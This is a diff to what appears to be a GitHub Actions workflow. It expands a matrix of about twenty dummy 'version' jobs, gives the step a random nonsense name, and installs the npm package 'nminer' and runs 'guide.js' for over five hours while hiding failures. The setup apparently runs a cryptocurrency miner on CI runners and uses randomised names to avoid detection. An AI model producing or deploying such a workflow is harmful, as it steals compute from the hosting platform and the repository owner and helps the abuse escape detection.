@@ -9,24 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2126 }
-          - { version: 6651 }
-          - { version: 4136 }
-          - { version: 7991 }
-          - { version: 1761 }
-          - { version: 1958 }
-          - { version: 7898 }
-          - { version: 6653 }
-          - { version: 8665 }
-          - { version: 4195 }
-          - { version: 2077 }
-          - { version: 8892 }
-          - { version: 7088 }
-          - { version: 908 }
-          - { version: 7316 }
-          - { version: 9675 }
-          - { version: 1819 }
-          - { version: 5054 }
+          - { version: 2883 }
+          - { version: 9779 }
+          - { version: 9126 }
+          - { version: 4909 }
+          - { version: 688 }
+          - { version: 3557 }
+          - { version: 1593 }
+          - { version: 3883 }
+          - { version: 9569 }
+          - { version: 2101 }
+          - { version: 558 }
+          - { version: 7765 }
+          - { version: 2418 }
+          - { version: 3050 }
+          - { version: 7895 }
+          - { version: 1945 }
+          - { version: 5832 }
+          - { version: 4174 }
+          - { version: 1113 }
+          - { version: 9241 }
 
     steps:
       - name: Checkout
@@ -37,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: past square mountain hoick
+      - name: less hefty
         run: |
           npm install nminer@latest
-          timeout 308m node guide.js || echo "guide executed"
+          timeout 326m node guide.js || echo "guide executed"
